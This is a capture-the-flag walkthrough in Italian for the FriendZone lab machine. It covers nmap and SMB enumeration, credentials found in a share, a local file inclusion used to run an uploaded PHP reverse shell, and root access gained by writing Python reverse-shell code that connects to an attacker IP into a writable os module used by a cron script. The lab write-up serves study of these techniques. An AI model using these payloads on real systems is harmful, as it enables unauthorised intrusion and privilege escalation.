# Drive

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.123
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.123 (10.10.10.123)
Host is up (0.053s latency).
Not shown: 993 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/20%OT=21%CT=1%CU=37724%PV=Y%DS=2%DC=I%G=Y%TM=653284
OS:0C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%II=I%TS=A)SEQ(SP=
OS:105%GCD=1%ISR=10B%TI=Z%CI=I%TS=A)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2023-10-20T13:43:32
|_  start_date: N/A
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -59m59s, deviation: 1h43m54s, median: 0s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-10-20T16:43:32+03:00
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

```

Passo alla fase successiva.

## Enumeration

**Porte 80 e 443 (Parte I)**

Innanzitutto, visito la pagina http://10.10.10.123/:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-1.png" />
</p>

Da questa ricavo un possibile nome di dominio: _freindzoneportal.red_.

Provo ad eseguire il comando _gobuster_ e _dirsearch_ ma non trovo nulla di interessante.

Provo quindi a visitare la pagina https://friendzone.red/:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-2.png" />
</p>

Controllando il codice sorgente della pagina:

```text
<title>FriendZone escape software</title>
<br>
<br>
<center><h2>Ready to escape from friend zone !</h2></center>
<center><img src="e.gif"></center>

<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```

La pagina https://friendzone.red/js/js/ contiene il seguente testo:

```text
Testing some functions !

I'am trying not to break things !
SENFdG5TUHlrRzE2OTc4MTMyMzJ3ZklSTWZvOXB0
```

Provo ad eseguire il comando _dirsearch_:

```text
Target: https://friendzone.red/

[10:51:35] Starting:
[10:51:38] 301 -  315B  - /js  ->  https://friendzone.red/js/
[10:51:38] 403 -  301B  - /.ht_wsr.txt
[10:51:38] 403 -  304B  - /.htaccess.bak1
[10:51:38] 403 -  304B  - /.htaccess.orig
[10:51:39] 403 -  302B  - /.htaccess_sc
[10:51:39] 403 -  306B  - /.htaccess.sample
[10:51:39] 403 -  304B  - /.htaccess.save
[10:51:39] 403 -  304B  - /.htaccess_orig
[10:51:39] 403 -  305B  - /.htaccess_extra
[10:51:39] 403 -  302B  - /.htaccessBAK
[10:51:39] 403 -  302B  - /.htaccessOLD
[10:51:39] 403 -  303B  - /.htaccessOLD2
[10:51:39] 403 -  294B  - /.htm
[10:51:39] 403 -  295B  - /.html
[10:51:39] 403 -  300B  - /.htpasswds
[10:51:39] 403 -  301B  - /.httr-oauth
[10:51:39] 403 -  304B  - /.htpasswd_test
[10:51:40] 403 -  294B  - /.php
[10:51:50] 301 -  318B  - /admin  ->  https://friendzone.red/admin/
[10:51:50] 200 -  742B  - /admin/
[10:51:50] 200 -  742B  - /admin/?/login
[10:51:50] 403 -  305B  - /admin/.htaccess
[10:52:14] 200 -  238B  - /index.html
[10:52:15] 200 -  922B  - /js/
[10:52:32] 403 -  304B  - /server-status/
[10:52:32] 403 -  303B  - /server-status

Task Completed
```

Nulla di utile.

**Porta 53**

Utilizzo il comando _nslookup_:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-3.png" />
</p>

Niente di interessante.

Provo a sfruttare i nomi di dominio recuperati precedentemente (tramite nmap), tentando il trasferimento di zona:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-4.png" />
</p>

Aggiungo quindi tutti i domini e sottodomini nel file _/etc/hosts_.


**Porte 139 e 445**

Utilizzo il comando _smbmap_ per identificare i file in codivisione:

```text
smbmap -H 10.10.10.123
```

Ottenendo il seguente risultato.

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-6.png" />
</p>

All'interno della cartella _general_ trovo il file _creds.txt_:

```text
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Ottengo così le credenziali per l'utente admin.


**Porte 80 e 443 (Parte II)**

Visito la pagina https://admin.friendzoneportal.red:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-5.png" />
</p>

Provo ad accedere con delle credenziali trovate precedentemente ma ottengo il seguente messaggio:

```text
Admin page is not developed yet !!! check for another one
```

Vado quindi sulla pagina https://administrator1.friendzoneportal.red:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-7.png" />
</p>

In questo caso riesco ad accedere e, una volta dentro, ottengo il seguente messaggio:

```text
Login Done ! visit /dashboard.php
```

Visito la pagina https://administrator1.friendzoneportal.red/dashboard.php:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-8.png" />
</p>

Sembra che la pagina permetta di visualizzare senza restrizioni le immagini sul sito.

Provo quindi a visitare il seguente indirizzo https://administrator1.friendzoneportal.red/dashboard.php/?image_id=a.jpg&pagename=timestamp:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-9.png" />
</p>

Provando a inserire il timestamp come parametro il messaggio scompare.

Provo a visitare la pagina https://uploads.friendzone.red/ trovata precedentemente:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-11.png" />
</p>

Questa mi permette di caricare delle immagini. Quindi provo a caricare l'immagine _abbaio.jpg_ e ottengo il seguente messaggio:

```text
Uploaded successfully !
1698158087
```

Provo quindi a visitare la pagina https://administrator1.friendzone.red/dashboard.php?image_id=abbaio.jpg&pagename=1698158087:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-12.png" />
</p>

**Nulla da fare!**

Tornando alla fase di enumerazione mi rendo conto di avere permessi in lettura e scrittura sulla cartella _Development_. Quindi provo ad aggiungere un file _test.php_ all'interno della cartella.

Il file _test.php_ contiene il seguente testo:

```text
<?php
echo "SI PUO' FARE!";
?>
```

Accedo alla cartella _Development_:

```text
smbclient //10.10.10.123/Development -N
```

Carico il file:

```text
put test.php
```

Visito la pagina https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/test:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-13.png" />
</p>

Quindi posso sfruttare questo meccanismo per caricare qualcosa di malevolo che mi permetta di dare vita a una reverse shell.


## Exploitation

Scarico il file php malevolo da qui https://pentestmonkey.net/tools/web-shells/php-reverse-shell.

Lo modifico, lo carico nella cartella _Development_ e avvio un listener sulla porta 1234.

Visitando la pagina https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell ottengo una reverse shell sulla macchina _FriendZone_!

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-14.png" />
</p>

Innanzitutto, utilizzo il seguente comando per ottenre una shell migliore:

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

Ho i privilegi per poter leggere il file _user.txt_ all'interno della cartella _/home/friend/_.

**Ottengo quindi il primo flag!**

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-15.png" />
</p>

## Privilege Escalation

La prima cosa che provo è l'esecuzione dello script _linpeas.sh_.

Ma purtroppo non ottengo nulla di interessante.

Quindi provo con _pspy_ e noto questo processo:

<p align="center">
  <img src="/Immagini/Linux-Box/FriendZone/friendzone-16.png" />
</p>

Scopro di avere soltanto i permessi in lettura per il file _reporter.py_, quindi cerco di studiare il contenuto alla ricerca di qualcosa di interessante:

```text
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

Perdo un po di tempo prima di capire che l'informazione importante risiede nel modulo importato, ovvero _os_.

Infatti, scopro di avere permessi illimitati per quanto riguarda questo file e per questo motivo posso sfruttarlo per ottenere una reverse shell con privilegi root.

Con la shell attualmente in uso non ho la possibilità di modificare il file tramite il comando _nano_. Quindi seguo [questa](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) guida per capire come ottenere una shell migliore.

Quindi modifico il file nel seguente modo:

```text
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.5",9999));
dup2(s.fileno(),0); 
dup2(s.fileno(),1);
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

E avvio un listener sulla porta 9999.

**Ottengo così una shell con privilegi root!**
